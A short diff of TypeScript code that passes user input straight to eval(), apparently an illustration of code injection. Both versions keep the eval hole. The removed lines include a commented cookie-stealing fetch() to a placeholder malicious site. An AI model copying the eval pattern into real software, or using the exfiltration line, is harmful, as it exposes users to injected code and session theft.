@@ -3,17 +3,17 @@
  * @param code - The code to execute.
  */
 function executeCode(code: string): void {
-    // Dangerous: Executes any code passed to it as a string
-    eval(code);
+    try {
+        // Dangerous: Executes any code passed to it as a string
+        const result = eval(code);
+        console.log(`Result: ${result}`);
+    } catch (error) {
+        console.error('Invalid code');
+    }
 }
 
-// Example usage: Potentially unsafe user input
-const userInput = `
-    console.log('This code is executed!');
-    alert('This is dangerous!');
-    // Malicious code could be injected here
-    // For example: fetch('http://malicious-site.com?data=' + encodeURIComponent(document.cookie));
-`;
+// Example usage
+const userInput = "alert('This is a dangerous action!');"; // Example of dangerous user input
 
-// Invoke the function with the unsafe code
+// Execute the potentially dangerous code
 executeCode(userInput);
